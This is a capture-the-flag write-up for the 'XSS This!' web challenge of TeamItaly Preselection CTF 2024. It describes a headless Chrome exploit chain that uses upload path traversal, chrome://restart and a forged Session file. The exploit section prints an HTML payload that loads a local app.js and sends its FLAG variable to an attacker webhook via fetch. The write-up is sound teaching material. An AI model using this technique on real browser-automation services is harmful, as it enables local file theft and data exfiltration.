# TeamItaly Preselection CTF 2024

## [web] XSS This! (2 solves)

If I don't use the flag nothing can happen? Right?

Site: [http://xssthis.challs.external.open.ecsc2024.it](http://xssthis.challs.external.open.ecsc2024.it)

Author: Alessandro Mizzaro <@Alemmi>

## Overview

The challenge is a web server with a Chrome headless and an exploitable file upload; as the description says, the flag is never used.
So, the goal is to read the app.js file, but there is no simple primitive to do that.

## Solution

The only way to read files is via Chrome, but the security policies do not allow us to read files without user interaction, except for file:// URLs that can read *.js files with a script tag.
Unfortunately `file` protocol is banned with a `blacklist` with `javascript://` and `data://`.

The file upload is unsafe, and we can upload the file directly to Chrome's userDataDir. So, we must find a method to open Chrome on a `file://` URL.

The browser with puppeteer opens Chrome on the `about:blank` page, but the code opens a new tab navigating to `chrome://newtab` and opens your URL with window.open so, from this context, we can open all the `chrome://` URLs, including the debug ones like `chrome://restart`

When Chrome is opened, it tracks its new tabs and states in a directory called Session inside the profile and If I restart Chrome with `chrome://restart`, by default, it takes the last session file.

So the exploit path is:
Upload an exploit file like exploit.html that takes the load app.js and sends the `FLAG` var through an endpoint.
Open CChrome on `chrome://restart` and wait a few seconds for Chrome to generate a Session file, and before it opens the URL, upload a crafted Session file with Tabs pointing to the exploit.html
You can generate a fake Session file with a local Chromium without understanding all its serialization methods.

## Exploit

exploit.html

```javascript
<script>function require(){ return {} } </script>
<script src=file:///home/app/app.js></script>
<script>fetch('${webhook}?flag='+FLAG)</script>
```

- Open local Chromium and go to `file:///home/app/sandbox/${sandbox}/uploads/exploit.html`.
- Copy the generated Session file and rename it with Session_99XXXXX` because Chrome uses that number to order the sessions.
- Upload exploit.html.
- Resolve the pow and send the headless to `chrome://restart`.
- Wait 5/6 seconds and upload the Session file with the path traversal.
- Enjoy
